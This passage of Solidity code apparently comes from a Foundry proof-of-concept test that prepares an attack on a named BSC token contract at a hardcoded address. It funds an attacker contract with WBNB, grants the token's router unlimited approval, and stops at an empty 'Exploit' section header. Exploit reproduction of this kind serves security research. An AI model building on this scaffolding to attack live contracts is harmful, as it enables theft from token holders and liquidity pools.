    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    address public wbnb;
    address public pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: get WBNB and prepare router
        wbnb = IBEP20LUNAINU(TARGET).WBNB();
        deal(wbnb, attacker, 100 ether);
        address routerAddress = IBEP20LUNAINU(TARGET).router();
        IBEP20(wbnb).approve(routerAddress, type(uint256).max);

        // Label addresses for clarity
        vm.label(TARGET, "LUNAINU Token");
        vm.label(wbnb, "WBNB");
        vm.label(pair, "LUNAINU-WBNB Pair");
    }

    // ─── Exploit ─────────────────────────────────────────────
